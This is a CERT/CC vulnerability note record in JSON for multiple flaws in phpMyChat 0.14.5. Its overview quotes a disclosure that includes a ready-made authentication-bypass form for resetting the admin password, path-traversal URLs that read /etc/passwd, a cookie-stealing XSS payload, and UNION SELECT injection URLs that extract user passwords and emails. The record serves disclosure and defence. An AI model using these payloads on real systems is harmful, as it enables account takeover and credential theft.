{
  "Author": "This document was written by Robert D Hanson.",
  "CAM_AttackerAccessRequired": "0",
  "CAM_EaseOfExploitation": "0",
  "CAM_Exploitation": "0",
  "CAM_Impact": "0",
  "CAM_InternetInfrastructure": "0",
  "CAM_Population": "0",
  "CAM_ScoreCurrent": 0,
  "CAM_ScoreCurrentWidelyKnown": 0,
  "CAM_ScoreCurrentWidelyKnownExploited": 0,
  "CAM_WidelyKnown": "0",
  "CERTAdvisory": "",
  "CVEIDs": "",
  "CVSS_AccessComplexity": "--",
  "CVSS_AccessVector": "--",
  "CVSS_Authenication": "--",
  "CVSS_AvailabilityImpact": "--",
  "CVSS_BaseScore": 0,
  "CVSS_BaseVector": "AV:--/AC:--/Au:--/C:--/I:--/A:--",
  "CVSS_CollateralDamagePotential": "Not Defined (ND)",
  "CVSS_ConfidentialityImpact": "--",
  "CVSS_EnvironmentalScore": 0,
  "CVSS_EnvironmentalVector": "CDP:Not Defined (ND)/TD:Not Defined (ND)/CR:Not Defined (ND)/IR:Not Defined (ND)/AR:Not Defined (ND)",
  "CVSS_Exploitability": "Not Defined (ND)",
  "CVSS_IntegrityImpact": "--",
  "CVSS_RemediationLevel": "Not Defined (ND)",
  "CVSS_ReportConfidence": "Not Defined (ND)",
  "CVSS_SecurityRequirementsAR": "Not Defined (ND)",
  "CVSS_SecurityRequirementsCR": "Not Defined (ND)",
  "CVSS_SecurityRequirementsIR": "Not Defined (ND)",
  "CVSS_TargetDistribution": "Not Defined (ND)",
  "CVSS_TemporalScore": 0,
  "CVSS_TemporalVector": "E:Not Defined (ND)/RL:Not Defined (ND)/RC:Not Defined (ND)",
  "DateCreated": "2004-06-18T14:44:15-04:00",
  "DateFirstPublished": "",
  "DateLastUpdated": "2004-06-18T14:46:00-04:00",
  "DatePublic": "",
  "Description": "",
  "ID": "VU#223089",
  "IDNumber": "223089",
  "IPProtocol": "",
  "Impact": "The complete impact of this vulnerability is not yet known.",
  "Keywords": [
    "phpmychat",
    "cross-site scripting",
    "sql injection",
    "authorization bypass"
  ],
  "Overview": "Informations : Language : PHP\nBugged Version : phpMyChat ver. 0.14.5 (and less ?)\nPatched version : none\nWebsite : http://www.phpheaven.net/\nProblems : Permanent XSS, authorization bypass, SQL-injection, include (read) files. Objects : - lib/login.lib.php3\n- admin/adminBody.php3\nand more ... Exploits : 1) For non-authorized login it needs to send only one additional variable: do_not_login=\"false\" Example: <HTML> <HEAD> <TITLE> phpMyChat exploit</TITLE>\n   </HEAD> <BODY> <FORM ACTION=\"http://[TARGET]/chat/edituser.php3\" METHOD=\"GET\" AUTOCOMPLETE=\"OFF\" NAME=\"EditUsrForm\"> <INPUT type=\"hidden\" name=\"FORM_SEND\" value=\"1\"> <INPUT type=\"hidden\" name=\"AUTH_USERNAME\" value=\"admin\"> <INPUT type=\"hidden\" name=\"AUTH_PASSWORD\" value=\"null\"> <!-- INSERT --> <INPUT type=\"hidden\" name=\"do_not_login\" value=\"false\"> <!-- END INSERT --> <INPUT TYPE=\"hidden\" NAME=\"L\" VALUE=\"russian\"> <INPUT TYPE=\"text\" NAME=\"U\" VALUE=\"admin\"> NAME *<BR>\n   <INPUT TYPE=\"text\" NAME=\"PASSWORD\" VALUE=\"hex_pass\">NEW PASS *<BR>\n   <INPUT TYPE=\"text\" NAME=\"FIRSTNAME\" VALUE=\"\">FIRST NAME<BR>\n   <INPUT TYPE=\"text\" NAME=\"LASTNAME\" VALUE=\"\">LAST NAME<BR>\n   <INPUT TYPE=\"radio\" NAME=\"GENDER\" VALUE=\"1\" >male<BR>\n   <INPUT TYPE=\"radio\" NAME=\"GENDER\" VALUE=\"2\" >female<BR>\n   <INPUT TYPE=\"text\" NAME=\"COUNTRY\" VALUE=\"\">COUNTRY<BR>\n   <INPUT TYPE=\"text\" NAME=\"WEBSITE\" VALUE=\"\">WEBSITE<BR>\n   <INPUT TYPE=\"text\" NAME=\"EMAIL\" VALUE=\"you@email.ru\">\n   <INPUT type=\"checkbox\" name=\"SHOWEMAIL\" value=\"1\" >show e-mail in public information<BR>\n   <INPUT TYPE=\"submit\" NAME=\"submit_type\" VALUE=\"Change\">\n   </FORM>\n   </BODY> </HTML> 2) To read files one needs to have the rights of administrator (read above for how to get them)! Variables \"sheet\" ? \"what\" are not filtered: require(\"./admin/admin${sheet}.php3\"); and\n   if (isset($What) && $What != \"\") include(\"./admin/admin\".$What.\".php3\"); Example: http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=[FILE]%00\n   http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=/../../../../../../etc/passwd%00\n   and\n   http://[TARGET]/chat/admin.php3?From=admin.php3&What=[FILE]%00&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=1\n   http://[TARGET]/chat/admin.php3?From=admin.php3&What=/../../../../../../etc/passwd%00&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=1 3) Cross-Site Scripting aka XSS\n   In input.php3 form there's variable \"C\", in which the color of messages is transferred. Example: <INPUT TYPE=\"TEXT\" NAME=\"C\" VALUE=\"#FF0000\\\"> [CODE] <INPUT TYPE=\"TEXT\" NAME=\"C\" VALUE=\"#FF0000\\\"> <script> alert(document.cookie)</script><a \\\"\"> 4) Great number of variables aren't filtered: $sortBy, $sortOrder, $startReg, $U, $LastCheck and more ... Example SQL-injection: http://[TARGET]/chat/usersL.php3?L=russian&R='[SQL]\n   http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20username,null,null,null%20FROM%20%20c_reg_users%20/*\n   http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20password,null,null,null%20FROM%20%20c_reg_users%20/*\n   http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20email,null,null,null%20FROM%20%20c_reg_users%20/* Patch/More Details : Waiting for the patch at http://www.phpheaven.net/ [ \u0412\u043b\u043e\u0436\u0435\u043d\u043d\u044b\u0435 \u0444\u0430\u0439\u043b\u044b    | <none> ] [ \u041c\u043e\u0441\u043a. \u0432\u0440\u0435\u043c\u044f 22:29, | \u0427\u0443\u043a\u0447\u0430 \u043d\u0435 \u0447\u0438\u0442\u0430\u0442\u0435\u043b\u044c, \u0447\u0443\u043a\u0447\u0430 CoSysOp... [ Copyright by [HEX] | mailto:hex(a)hex.net.ru ]",
  "References": "http://www.securityfocus.com/bid/10556",
  "Resolution": "The CERT/CC is currently unaware of a practical solution to this problem.",
  "Revision": 1,
  "SystemsAffectedPreamble": "",
  "ThanksAndCredit": "",
  "Title": "Multiple vulnerabilities in PHPMyChat",
  "US-CERTTechnicalAlert": "",
  "VRDA_D1_DirectReport": "",
  "VRDA_D1_Impact": "",
  "VRDA_D1_Population": "",
  "VulnerabilityCount": 1,
  "Workarounds": ""
}